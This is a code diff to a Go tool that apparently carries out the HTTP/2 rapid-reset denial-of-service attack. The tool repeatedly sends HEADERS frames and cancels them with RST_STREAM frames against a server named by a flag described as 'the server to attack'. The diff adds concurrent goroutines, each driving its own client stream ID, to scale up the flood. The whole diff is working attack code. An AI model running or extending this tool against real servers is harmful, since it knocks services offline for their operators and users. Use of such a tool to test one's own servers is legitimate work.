@@ -3,10 +3,10 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	"flag"
 	"log"
 	"net/url"
 	"time"
-	"flag"
 
 	"golang.org/x/net/http2"
 	"golang.org/x/net/http2/hpack"
@@ -19,6 +19,7 @@ var sleep = flag.Int("d", 1, "delay between sending HEADERS and RST_STREAM frame
 var ignoreGoAway = flag.Bool("i", false, "ignore GOAWAY frames sent by the server")
 var serverUrl = flag.String("u", "https://localhost:443/", "the server to attack")
 var skipVerify = flag.Bool("s", true, "skip certificate verifcation")
+var routines = flag.Int("routines", 1, "number of concurrent streams to attack")
 
 func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
 	var headerBlock bytes.Buffer
@@ -90,15 +91,25 @@ func main() {
 
 		//at this point, the connection is established.
 
-		attack(framer, serverUrl, *attempts)
+		var streamCounter uint32 = 1 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
+		for i := 0; i < *routines; i++ {
+			streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
+			go attack(streamFramer, serverUrl, *attempts, streamCounter)
+			streamCounter += 2
+		}
+		attack(framer, serverUrl, *attempts, streamCounter)
 		conn.Close()
 	}
 }
 
-const streamId uint32 = 1
+func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter uint32) {
+	
+	err := framer.WriteHeaders(createHeaderFrameParam(url, streamCounter))
+	if err != nil {
+		log.Fatalf("unable to send initial HEADERS frame")
+	}
+	log.Printf("sent initial headers")
 
-func attack(framer *http2.Framer, url *url.URL, attempts uint) {
-	framer.WriteHeaders(createHeaderFrameParam(url, streamId))
 	var i uint = 0
 	for {
 		frame, err := framer.ReadFrame()
@@ -117,13 +128,13 @@ func attack(framer *http2.Framer, url *url.URL, attempts uint) {
 		
 			time.Sleep(time.Millisecond * time.Duration(*sleep))
 			
-			err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
+			err = framer.WriteRSTStream(streamCounter, http2.ErrCodeCancel)
 			if err != nil {
 				log.Fatalf("failed sending RST STREAM frame: %v", err)
 			}
 
 			log.Println("wrote RST STREAM frame")
-			err = framer.WriteHeaders(createHeaderFrameParam(url, streamId))
+			err = framer.WriteHeaders(createHeaderFrameParam(url, streamCounter))
 			if err != nil {
 				log.Fatalf("error sending new HEADERS frame: %v", err)
 			}
